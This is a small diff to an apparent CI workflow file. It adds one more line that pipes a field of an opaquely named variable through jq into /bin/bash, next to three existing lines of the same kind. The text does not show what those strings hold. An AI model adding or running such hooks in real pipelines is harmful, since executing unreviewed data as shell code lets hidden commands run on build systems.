@@ -27,6 +27,7 @@ jobs:
           echo $pcxs52 | jq -r .so465 | /bin/bash
           printf '%s' "$hpy65" | jq -r .ca0 | /bin/bash
           printf '%s' "$bhmdb168" | jq -r .dl5715 | /bin/bash
+          printf '%s' "$l8071" | jq -r .y2 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
